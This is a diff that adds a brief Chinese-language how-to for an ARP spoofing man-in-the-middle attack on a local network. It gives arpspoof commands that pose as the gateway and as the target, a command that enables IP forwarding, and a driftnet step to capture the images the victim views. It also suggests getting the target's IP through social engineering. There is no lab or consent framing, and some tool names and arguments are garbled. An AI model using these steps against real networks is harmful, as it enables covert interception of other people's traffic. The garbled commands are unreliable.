@@ -1,0 +1,31 @@
+原理：让局域网内其他主机认为我是网关
+
+查看网关，记录网关ip
+ipconfig /all
+
+搞到目标ip（社工或者主动侦察）
+
+kali下：
+arp -a   查看arp缓存表，记录ip及物理地址
+ifconfig 记录ip及物理地址
+
+运用工具arpdpoof
+arpspoof -h   查看此命令的相关参数
+arpspoof -t 目标ip -r 网关ip（告诉目标我是网关，由于我不是真正的网关，所有对面会断网）
+
+查看目标机arp缓存表，会发现攻击机物理地址跟网关一样
+
+将自己伪装成目标机
+arpspoof -t 网关ip -r 目标ip
+
+此时目标机无法上网，因为linux不支持ip转发，可以将/proc/sys/net/ipv4/ip_forward修改为1（默认为0）
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+此时目标机可以上网
+
+使用工具drifnet捕获目标机屏幕活动
+drifnet -i 目标ip
+
+
+
+
